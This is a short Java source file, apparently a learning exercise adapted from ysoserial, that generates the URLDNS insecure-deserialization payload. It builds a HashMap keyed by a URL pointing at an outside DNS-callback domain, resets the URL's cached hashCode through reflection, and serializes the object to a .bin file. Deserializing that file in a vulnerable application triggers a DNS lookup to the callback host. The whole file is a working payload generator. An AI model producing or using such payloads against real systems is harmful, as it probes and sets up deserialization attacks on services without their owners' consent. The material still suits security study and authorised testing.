package edu.hacker;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

/*
learn and edit from ysoserial
 */
public class URLDNS {
  public static void main(String[] args) throws Exception{
      //create the handler
      String dnsPaltform = "http://005ab237.dns.1433.eu.org."; //the DNS paltform u used
      URLStreamHandler handler = new myHandler();
      //create the URL
      URL url = new URL(null, dnsPaltform, handler);
      //put into HashMap
      HashMap hashMap = new HashMap();
      hashMap.put(url, "foobar");
      //reset the hashCode to "-1"
      Class clz = URL.class;
      Field field = clz.getDeclaredField("hashCode");
      field.setAccessible(true);
      field.set(url, -1);

      //serializztion
      FileOutputStream file = new FileOutputStream("chenlvtang.bin");
      ObjectOutputStream ser = new ObjectOutputStream(file);
      ser.writeObject(hashMap);
      ser.close();
  }

  static class myHandler extends URLStreamHandler{
      protected synchronized InetAddress getHostAddress(URL u) {
          return null;
      }
      @Override
      protected URLConnection openConnection(URL u) throws IOException {
          return null;
      }
  }
}
